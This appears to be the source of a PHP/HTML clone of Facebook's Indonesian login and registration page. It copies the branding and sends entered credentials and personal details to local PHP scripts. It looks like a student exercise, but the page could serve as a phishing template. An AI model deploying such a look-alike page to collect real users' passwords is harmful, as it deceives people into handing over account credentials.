<!DOCTYPE html>
<html>
<head>
	<link rel="icon" type="image/png" href="768px-F_icon.svg.png">
	<title>Facebook - Masuk atau Daftar</title>
	<link rel="stylesheet" type="text/css" href="style.css?v=1.0">
	<link rel="stylesheet" type="text/css" href="style.css?v=1.4">
</head>
<body>
	<?php
		include 'createdb.php';
		include 'koneksi.php';
	?>
	<div class="container">
		
		<div id="header">

			<div class="wrapper">

				<div id="logo">
				<img src="logo.png" width="170px">
				</div>

				<div id="login">
				<form action="login_proses.php" method="POST" onSubmit="return validasi()">
				<table width="390px">
					<tr>
						<td><label name="user" for="user">Email atau Telepon</label></td>
						<td><label name="pass" for="pass">Kata Sandi</label></td>
					</tr>
					<tr>
						<td><input type="text" name="login_user" id="user"></td>
						<td><input type="password" name="login_pass" id="pass"></td>
						<td><button type="submit" class="button">Masuk</button></td>
					</tr>
					<tr>
						<td></td>
						<td><a href="#">Lupa akun?</a></td>
					</tr>
				</table>
			</form>
			</div>

			</div>	
		</div>
		

		<div id="content">
			<div class="wrapper">
				<div id="intro">
						<p>Facebook membantu Anda terhubung dan
						berbagi dengan orang-orang dalam kehidupan
						Anda.</p>
						<img src="world.png">
				</div>

				<div id="sign">
					<form action="proses_tambah.php" method="POST">
						<div id="title">
						Daftar
						</div>
						
						<div class="sub_title">
						Gratis, sampai kapan pun.
						</div>

						<div id="form_input">
						<input type="hidden" name="id">
						<div id="nama">
						<div id="depan"><input type="text" name="depan" placeholder="Nama depan" required></div>
						<div id="belakang"><input type="text" name="belakang" placeholder="Nama belakang" equired></div>
						</div>

						<div id="data"><input type="text" name="userName" id="in2" placeholder="Nomor seluler atau email" required></div>
						<div id="data"><input type="password" name="password" id="in2" placeholder="Kata sandi baru" required></div>


						<div id="tanggal">
						<div class="sub_title">Tanggal Lahir</div>
						<div id="option_date">
						<div id="isi_date">
						<select name="tanggal" id="tanggal">
							<option value="">Tanggal</option>
							<option value="01">1</option>
							<option value="02">2</option>
							<option value="03">3</option>
							<option value="04">4</option>
							<option value="05">5</option>
							<option value="06">6</option>
							<option value="07">7</option>
							<option value="08">8</option>
							<option value="09">9</option>
							<option value="10">10</option>
							<option value="11">11</option>
							<option value="12">12</option>
							<option value="13">13</option>
							<option value="14">14</option>
							<option value="15">15</option>
							<option value="16">16</option>
							<option value="17">17</option>
							<option value="18">18</option>
							<option value="19">19</option>
							<option value="20">20</option>
							<option value="21">21</option>
							<option value="22">22</option>
							<option value="23">23</option>
							<option value="24">24</option>
							<option value="25">25</option>
							<option value="26">26</option>
							<option value="27">27</option>
							<option value="28">28</option>
							<option value="29">29</option>
							<option value="30">30</option>
							<option value="31">31</option>
						</select>

						<select name="bulan" id="bulan">
							<option value="">Bulan</option>
							<option value="01">Januari</option>
							<option value="02">Februari</option>
							<option value="03">Maret</option>
							<option value="04">April</option>
							<option value="05">Mei</option>
							<option value="06">Juni</option>
							<option value="07">Juni</option>
							<option value="08">Agustus</option>
							<option value="09">September</option>
							<option value="10">Oktober</option>
							<option value="11">November</option>
							<option value="12">Desember</option>
						</select>

						<select name="tahun" id="tahun">
							<option value="">Tahun</option>
							<option value="2018">2018</option>
							<option value="2017">2017</option>
							<option value="2016">2016</option>
							<option value="2015">2015</option>
							<option value="2014">2014</option>
							<option value="2013">2013</option>
							<option value="2012">2012</option>
							<option value="2011">2011</option>
							<option value="2010">2010</option>
							<option value="2009">2009</option>
							<option value="2008">2008</option>
							<option value="2007">2007</option>
							<option value="2006">2006</option>
							<option value="2005">2005</option>
							<option value="2004">2004</option>
							<option value="2003">2003</option>
							<option value="2002">2002</option>
							<option value="2001">2001</option>
							<option value="2000">2000</option>
						</select>
						</div>

						<div id="ask">
						<a href="#">Mengapa saya harus<br>memberikan tanggal lahir<br>saya?</a>
						</div>

						<div id="gender">
							<div id="prm"><input type="radio" name="gender" value="0" id="perempuan"><label for="perempuan">Perempuan</label></div>
							<div id="laki"><input type="radio" name="gender" value="1" id="laki-laki"><label for="laki-laki">Laki-laki</label></div>
						</div>

						<div id="rule">
							<p>Dengan mengklik Daftar, Anda menyetujui <a href="#">Ketentuan</a>, <a href="#">Kebijakan<br>Data</a> dan <a href="#">Kebijakan Cookie</a> kami. Anda akan menerima<br>Notifikasi SMS dari Facebook dan dapat menolaknya kapan<br>saja.</p>							
						</div>

						<div id="kirim">
							<button type="submit" name="submit">Daftar</button>
						</div>
						<div id="make_page">
							<p><a href="#">Buat Halaman</a> untuk selebriti, grup musik, atau bisnis.</p>
						</div>
					</div>
				</div>
			</div>
					</form>

				</div>
			</div>
		</div>
		

		<div id="footer">
			<div id="isi_footer" class="wrapper">
				<div id="bahasa">
				Bahasa Indonesia 
				<a href="#">English (UK)</a>
				<a href="#">Basa Jawa</a>
				<a href="#">Bahasa Melayu</a>
				<a href="#">日本語</a>
				<a href="#">العربية</a>
				<a href="#">Français (France)</a>
				<a href="#">Español</a>
				<a href="#">한국어</a>
				<a href="#">Português (Brasil)</a>
				<a href="#">Deutsch</a>
				</div>

				<hr size="1px" color="#c4c4c4">

				<div id="other">

				</div>

				<div id="copyright">
				Facebook @ 2018
				</div>

			</div>
		</div>

	</div>
</body>
<script type="text/javascript">
	function validasi() {
		var username = document.getElementById("user").value;
		var password = document.getElementById("pass").value;		
		if (username != "" && password!="") {
			return true;
		}else{
			alert('Username dan Password harus di isi !');
			return false;
		}
	}
 
</script>
</html>